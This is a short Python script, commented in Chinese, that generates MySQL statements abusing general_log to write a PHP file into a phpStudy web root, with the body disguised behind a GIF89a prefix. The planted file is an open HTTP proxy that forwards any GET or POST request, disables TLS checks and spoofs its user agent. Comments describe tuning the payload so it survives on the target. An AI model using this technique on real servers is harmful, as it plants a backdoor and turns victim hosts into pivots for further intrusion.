#!/usr/bin/env python3
"""gen_proxy_post.py - 生成支持POST的代理 (chr()无引号写法, 模拟proxy_t存活格式)"""
# 用chr()拼接所有引号, 避免general_log写入冲突
body = r'''<?php
$u = $_GET['u'];
if ($u) {
  $ch = curl_init($u);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_TIMEOUT, 25);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  $ua = chr(77).chr(111).chr(122).chr(105).chr(108).chr(108).chr(97);
  curl_setopt($ch, CURLOPT_USERAGENT, $ua);
  if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, file_get_contents('php://input'));
  }
  $h = array();
  $ct = $_SERVER['CONTENT_TYPE'];
  if ($ct) { $h[] = 'Content-Type: '.$ct; }
  curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
  $r = curl_exec($ch);
  $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  curl_close($ch);
  http_response_code($code);
  echo $r;
}
?>'''

# 全部单引号换成chr(39)拼接
def esc(s):
    return s.replace("'", "chr(39).chr(46).chr(39)")

body_esc = body.replace("'", "''")  # SQL转义

sql = []
sql.append("SET GLOBAL general_log = OFF;")
sql.append("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/proxy_p.php';")
sql.append("SET GLOBAL general_log = ON;")
sql.append("SELECT 'GIF89a%s//'" % body_esc.replace("?>", ""))
sql.append("SET GLOBAL general_log = OFF;")
with open('/tmp/proxy_p.sql', 'w') as f:
    f.write('\n'.join(sql) + '\n')
print('proxy_p.sql ready, len:', len(body))
